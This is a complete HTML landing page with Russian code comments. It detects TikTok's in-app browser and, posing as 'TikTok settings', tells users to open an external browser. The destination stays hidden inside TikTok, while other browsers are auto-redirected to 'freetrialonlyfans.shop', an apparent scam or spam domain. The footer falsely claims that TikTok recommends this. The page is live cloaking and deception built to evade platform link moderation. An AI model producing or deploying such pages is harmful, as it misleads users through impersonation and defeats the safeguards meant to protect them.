<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free</title>
    <style>
        body {
            font-family: "Roboto", Arial, sans-serif;
            background-color: #000;
            color: white;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            text-align: center;
            position: relative;
        }

        .instructions {
            font-size: 1.2rem;
            color: #ccc;
            margin-top: 20px;
            line-height: 1.5;
            max-width: 90%;
        }

        .highlight {
            color: #fff;
            font-weight: bold;
        }

        .arrow {
            display: inline-block;
            width: 0;
            height: 0;
            border-left: 10px solid transparent;
            border-right: 10px solid transparent;
            border-bottom: 20px solid #fff;
            position: absolute;
            top: 10%;
            right: 5%;
            animation: bounce 1s infinite alternate;
        }

        @keyframes bounce {
            0% { transform: translateY(0); }
            100% { transform: translateY(10px); }
        }

        .button-container {
            margin-top: 30px;
        }

        button {
            background-color: #ff4b5c;
            color: white;
            border: none;
            padding: 15px 25px;
            border-radius: 5px;
            font-size: 1.1rem;
            cursor: pointer;
            transition: background-color 0.3s ease, transform 0.3s ease;
        }

        button:hover {
            background-color: #ff6b7f;
            transform: scale(1.05);
        }

        .footer {
            position: absolute;
            bottom: 10px;
            color: #888;
            font-size: 0.9rem;
            width: 100%;
            text-align: center;
            padding: 10px 0;
        }
    </style>
    <script>
        // Проверка, открыт ли сайт в TikTok WebView
        function isTikTokWebView() {
            const userAgent = navigator.userAgent.toLowerCase();
            return userAgent.includes("tiktok") || userAgent.includes("musically");
        }

        // Функция для редиректа
        function redirect() {
            window.location.href = "https://freetrialonlyfans.shop/"; // URL основного сайта
        }

        // Задержка перед редиректом
        window.onload = function () {
            if (!isTikTokWebView()) {
                setTimeout(redirect, 9000); // Редирект через 9 секунд для внешнего браузера
            }
        };
    </script>
</head>
<body>
    <h1>TikTok settings</h1>
    <div class="arrow"></div>
    <div class="instructions">
        If you're using TikTok, tap the <span class="highlight">three dots</span> in the top right corner and select <span class="highlight">"Open in Browser"</span>.  
        Once the browser opens, click the button below to proceed to the website.
    </div>
    <div class="button-container">
        <button onclick="redirect()">Go to Website</button>
    </div>
    <div class="footer">
        TikTok recommends viewing this page in an external browser for full functionality.
    </div>
</body>
</html>
